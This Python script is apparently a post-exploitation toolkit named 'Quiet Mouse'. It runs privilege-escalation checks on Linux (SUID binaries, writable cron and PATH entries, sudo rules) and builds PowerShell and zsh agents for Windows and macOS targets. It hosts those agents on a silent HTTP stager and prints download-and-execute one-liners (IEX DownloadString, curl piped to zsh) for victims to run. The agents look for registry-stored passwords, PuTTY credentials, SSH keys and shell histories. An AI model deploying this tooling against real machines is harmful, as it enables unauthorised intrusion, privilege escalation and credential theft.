#!/usr/bin/env python3
import sys
import os
import http.server
import socketserver
import threading
import subprocess
import platform

server_instance = None
server_thread = None
lhost = None
lport = None

def print_banner():
    print("=" * 80)
    print(" " * 34 + "QUIET MOUSE")
    print(" " * 20 + "LOCAL ENVIRONMENT POST-EXPLORATION AUDIT SUITE")
    print("=" * 80 + "\n")

def run_cmd(command):
    """Safely executes local operating system strings and traps output returns."""
    try:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = proc.communicate()
        return (stdout + stderr).decode('utf-8', errors='ignore').strip()
    except Exception as e:
        return f"[-] Failed to execute runtime check: {e}"

def audit_linux_local():
    """Performs native, interactive checks right inside the active Linux terminal room."""
    while True:
        print("\n--- [L] Linux Native Local Audit Selection ---")
        print(" [1] Host Identity & Environment Baseline (Kernel, Users, Groups)")
        print(" [2] Local Network Frameworks (Active Sockets, Ports, Routing)")
        print(" [3] Searching for SUID/SGID Binaries (PrivEsc Targets)")
        print(" [4] Task Automations & Writable Cron Paths")
        print(" [5] Password Hashes Visibility & Weak File Permissions (/etc/shadow check)")
        print(" [6] Sudo Privileges & Writable System Paths (User capabilities)")
        print(" [7] Run Full Local Audit Sweep (Execute Options 1-6)")
        print(" [999] Return to Main OS Menu")
        
        choice = input("\n[?] Select Option (1-7 / 999): ").strip()
        if choice == '999': break
        
        print("\n" + "="*80)
        if choice == '1' or choice == '7':
            print("\n" + "-"*40 + "\n[+] CONFIG: Host Environment Data...\n" + "-"*40)
            print(f"Kernel Version: {run_cmd('uname -a')}\nUser/Privs: {run_cmd('id')}\nLogged In Users:\n{run_cmd('who || w')}")
        if choice == '2' or choice == '7':
            print("\n" + "-"*40 + "\n[+] CONFIG: Network Sockets & Port Alignments...\n" + "-"*40)
            print(f"Listening Ports:\n{run_cmd('ss -tuln || netstat -an | grep LISTEN')}\n\nRouting Table:\n{run_cmd('ip route || route -n')}")
        if choice == '3' or choice == '7':
            print("\n" + "-"*40 + "\n[+] CONFIG: Searching for SUID/SGID Binaries...\n" + "-"*40)
            print(run_cmd('find / -perm -4000 -type f 2>/dev/null | head -n 25'))
        if choice == '4' or choice == '7':
            print("\n" + "-"*40 + "\n[+] CONFIG: Task Automations (Cron Paths)...\n" + "-"*40)
            print(run_cmd('ls -la /etc/cron* /etc/crontab 2>/dev/null'))
        if choice == '5' or choice == '7':
            print("\n" + "-"*40 + "\n[+] CONFIG: Checking Password Visibility & Permissions...\n" + "-"*40)
            print(f"Shadow Permissions: {run_cmd('ls -l /etc/shadow 2>/dev/null || echo \"[-] Cannot view /etc/shadow directly\"')}")
            print(f"Writable Configuration Files check:\n{run_cmd('find /etc -writable -type f 2>/dev/null | head -n 15')}")
        if choice == '6' or choice == '7':
            print("\n" + "-"*40 + "\n[+] CONFIG: Evaluating Sudo Permissions & Environment paths...\n" + "-"*40)
            print(f"Sudo Rules:\n{run_cmd('sudo -l -n 2>/dev/null || echo \"[-] Sudo demands password interaction\"')}")
            print(f"\nWritable Root PATH Directories:\n{run_cmd('echo $PATH | tr \":\" \"\\n\" | xargs -I {} find {} -maxdepth 0 -writable 2>/dev/null')}")
        if choice not in ['1', '2', '3', '4', '5', '6', '7']:
            print("[-] Choice index not recognized.")
        print("="*80)
        input("\n[*] Press Enter to continue...")
def generate_windows_payload():
    """Builds the native PowerShell script that executes directly on a Windows target."""
    unquoted_command = "cmd.exe /c 'wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:" + chr(92) + "windows" + chr(92) + "\" | findstr /v \"\"\"'"
    
    ps_code = r"""# Quiet Mouse Native Windows Audit Agent
function Show-Menu {
    Clear-Host
    Write-Output "================================================================================"
    Write-Output "                        QUIET MOUSE: WINDOWS TARGET AGENT"
    Write-Output "================================================================================"
    Write-Output " [1] System Metadata & Hotfix Patch Status"
    Write-Output " [2] User Context & Integrity Privileges"
    Write-Output " [3] Netstat Active Listening Endpoints"
    Write-Output " [4] Scan for Unquoted Service Paths"
    Write-Output " [5] Audit Local Active Directory & Domain Recon"
    Write-Output " [6] Check for Cleartext Passwords in Registry & Files"
    Write-Output " [7] Run Full Automated System Sweep"
    Write-Output " [999] Exit Agent"
}

while ($true) {
    Show-Menu
    $choice = Read-Host "`n[?] Select Audit Vector"
    if ($choice -eq "999") { Write-Output "[*] Exiting Agent."; break }
    
    Write-Output "`n" + ("="*80)
    if ($choice -eq "1" -or $choice -eq "7") {
        Write-Output "[+] RUNNING VECTOR 1: SYSTEM HOTFIX & OS METADATA..."
        Get-WmiObject Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture | Format-List
        Get-HotFix | Select-Object HotFixID, Description, InstalledOn | Select-Object -First 10
    }
    if ($choice -eq "2" -or $choice -eq "7") {
        Write-Output "`n[+] RUNNING VECTOR 2: USER TOKENS & SECURITY GROUPS..."
        whoami /all
        net localgroup administrators
    }
    if ($choice -eq "3" -or $choice -eq "7") {
        Write-Output "`n[+] RUNNING VECTOR 3: NETSTAT LISTENING ENDPOINTS..."
        netstat -ano | Select-String "LISTENING" | Select-Object -First 20
    }
    if ($choice -eq "4" -or $choice -eq "7") {
        Write-Output "`n[+] RUNNING VECTOR 4: SEARCHING FOR UNQUOTED SERVICE PATHS..."
""" + "        " + unquoted_command + r"""
    }
    if ($choice -eq "5" -or $choice -eq "7") {
        Write-Output "`n[+] RUNNING VECTOR 5: AD & DOMAIN TRUST RECONNAISSANCE..."
        [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 2>$null || Write-Output "[-] Host is likely not domain joined."
        net config workstation | Select-String "Logon domain"
    }
    if ($choice -eq "6" -or $choice -eq "7") {
        Write-Output "`n[+] RUNNING VECTOR 6: SEARCHING REGISTRY FOR PASSWORDS..."
        reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword 2>$null
        reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /v Password 2>$null
    }
    Write-Output "="*80
    Read-Host "`n[*] Press Enter to return to menu"
}
"""
    return ps_code

def generate_mac_payload():
    """Builds the native Zsh script that executes directly on a macOS target."""
    return r"""#!/bin/zsh
show_menu() {
    clear
    echo "================================================================================"
    echo "                        QUIET MOUSE: MACOS TARGET AGENT"
    echo "================================================================================"
    echo " [1] Host Identity & Environment Baseline"
    echo " [2] Local Network Frameworks & Open Ports"
    echo " [3] Running Processes & Kernel Status"
    echo " [4] Enumerate System Persistence Profiles (LaunchDaemons)"
    echo " [5] Scan for Cleartext SSH Keys & Terminal Configurations"
    echo " [6] Run Full Automated System Sweep"
    echo " [999] Exit Agent"
}

while true; do
    show_menu
    echo -n "\n[?] Select Audit Vector: "
    read choice
    if [ "$choice" = "999" ]; then echo "[*] Exiting Agent."; break; fi
    
    echo "\n================================================================================"
    if [ "$choice" = "1" ] || [ "$choice" = "6" ]; then
        echo "[+] RUNNING VECTOR 1: HOST ARCHITECTURE & IDENTITY..."
        sw_vers && id
    fi
    if [ "$choice" = "2" ] || [ "$choice" = "6" ]; then
        echo "\n[+] RUNNING VECTOR 2: ACTIVE NETWORK SOCKETS..."
        netstat -an | grep LISTEN
    fi
    if [ "$choice" = "3" ] || [ "$choice" = "6" ]; then
        echo "\n[+] RUNNING VECTOR 3: PROCESS PRIVILEGE CONTEXTS..."
        ps aux | head -n 20
    fi
    if [ "$choice" = "4" ] || [ "$choice" = "6" ]; then
        echo "\n[+] RUNNING VECTOR 4: ENUMERATING SYSTEM PERSISTENCE..."
        ls -la /Library/LaunchDaemons /Library/LaunchAgents ~/Library/LaunchAgents 2>/dev/null | head -n 15
    fi
    if [ "$choice" = "5" ] || [ "$choice" = "6" ]; then
        echo "\n[+] RUNNING VECTOR 5: SEARCHING FOR SENSITIVE DISK KEYS..."
        ls -la ~/.ssh ~/.bash_history ~/.zsh_history 2>/dev/null
    fi
    echo "================================================================================"
    echo -n "\n[*] Press Enter to return to menu..."
    read discard
done
"""

def start_stager_server(filename, payload_content, port):
    global server_instance, server_thread
    if server_instance:
        try: server_instance.shutdown()
        except: pass
    try:
        with open(filename, "w") as f:
            f.write(payload_content)
        class QuietHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(self, format, *args): pass
        server_instance = socketserver.TCPServer(("0.0.0.0", int(port)), QuietHandler)
        server_thread = threading.Thread(target=server_instance.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        print(f"\n[+] Stager Online! Successfully hosting '{filename}' at http://0.0.0:{port}/{filename}")
        return True
    except Exception as e:
        print(f"[-] Staging allocation error: {e}")
        return False
def audit_mac_menu():
    """Handles master platform menu staging parameters for macOS targets."""
    global lhost, lport
    while True:
        print("\n--- [M] macOS Audit Framework Selection ---")
        print(" [1] Host Identity & Environment Baseline (Run Natively)")
        print(" [2] Local Network Frameworks & Open Ports (Run Natively)")
        print(" [3] Run Full Local Audit Sweep (Execute Options 1-2 Natively)")
        print(" [4] Compile & Stage Deployment Payload for Remote Mac Target")
        print(" [999] Return to Main OS Menu")
        
        choice = input("\n[?] Select Option (1-4 / 999): ").strip()
        if choice == '999': break
        
        print("\n" + "="*80)
        if choice == '1' or choice == '3':
            print(f"OS Version: {run_cmd('sw_vers')}\nUser Privs: {run_cmd('id')}")
        if choice == '2' or choice == '3':
            print(run_cmd('netstat -an | grep LISTEN'))
        if choice == '4':
            if lhost and lport:
                payload = generate_mac_payload()
                if start_stager_server("qm_mac.sh", payload, lport):
                    print("\n" + "-"*80)
                    print(f"curl -s http://{lhost}:{lport}/qm_mac.sh | zsh")
                    print("-" * 80)
        if choice not in ['1', '2', '3', '4']:
            print("[-] Choice index not recognized.")
        print("="*80)
        input("\n[*] Press Enter to continue...")

def audit_windows_menu():
    """Handles master platform menu staging parameters for Windows targets."""
    global lhost, lport
    while True:
        print("\n--- [W] Windows Audit Framework Selection ---")
        print(" [1] Systeminfo Parse & Hotfix Patch Status (Run Natively)")
        print(" [2] User Integrity Tokens & Privileges (Run Natively)")
        print(" [3] Netstat Listening Endpoints (Run Natively)")
        print(" [4] Unquoted Service Paths (Run Natively)")
        print(" [5] Run Full Local Audit Sweep (Execute Options 1-4 Natively)")
        print(" [6] Compile & Stage Deployment Payload for Remote Windows Target")
        print(" [999] Return to Main OS Menu")
        
        choice = input("\n[?] Select Option (1-6 / 999): ").strip()
        if choice == '999': break
        
        print("\n" + "="*80)
        if choice == '1' or choice == '5':
            print(run_cmd('systeminfo | findstr /B /C:"OS Name" /C:"OS Version"') + "\n" + run_cmd('wmic qfe get HotFixID'))
        if choice == '2' or choice == '5':
            print(run_cmd('whoami /all'))
        if choice == '3' or choice == '5':
            print(run_cmd('netstat -ano | findstr LISTENING'))
        if choice == '4' or choice == '5':
            print(run_cmd(f'wmic service get name,pathname | findstr /i "auto" | findstr /v """'))
        if choice == '6':
            if lhost and lport:
                # Corrected: Explicitly matching the exact generation identity
                payload = generate_windows_payload()
                if start_stager_server("qm_win.ps1", payload, lport):
                    print("\n" + "-"*80)
                    print(f"powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/qm_win.ps1')\"")
                    print("-" * 80)
        if choice not in ['1', '2', '3', '4', '5', '6']:
            print("[-] Choice index not recognized.")
        print("="*80)
        input("\n[*] Press Enter to continue...")

def main():
    global lhost, lport
    print_banner()
    current_os = platform.system()
    print(f"[+] Local System Engine running detection routines... Local Host: {current_os}")

    while True:
        print("\n--- Target Host Operating System Selector ---")
        print(" [W] Windows Payload Framework Deployment (Stager)")
        print(" [M] macOS Payload Framework Deployment (Stager)")
        print(" [L] Linux Native Distribution Module (Local Run)")
        print(" [999] Exit Toolkit Entirely")
        
        os_choice = input("\n[?] Select Target OS (W/M/L/999): ").strip().upper()
        
        if os_choice == '999':
            print("[*] Shutting down Quiet Mouse Stager Framework.")
            if server_instance: server_instance.shutdown()
            for f in ["qm_win.ps1", "qm_mac.sh"]:
                if os.path.exists(f): os.remove(f)
            break
            
        elif os_choice == 'L':
            audit_linux_local()
            
        elif os_choice in ['W', 'M']:
            if not lhost or not lport:
                print("\n" + "*"*60)
                print("[*] WEB STAGER SETUP REQUIRED FOR CROSS-PLATFORM PACKAGING")
                print("*"*60)
                lhost = input("[?] Enter your Host Local IP (LHOST for deployment): ").strip()
                lport = input("[?] Enter Port to allocate for temporary Web Stager (e.g., 8080): ").strip()
                if not lhost or not lport:
                    print("[-] Stager attributes cannot be blank.")
                    lhost, lport = None, None
                    continue

            if os_choice == 'W':
                audit_windows_menu()
            elif os_choice == 'M':
                audit_mac_menu()
        else:
            print("[-] Platform signature selection criteria mismatch.")

if __name__ == "__main__":
    main()
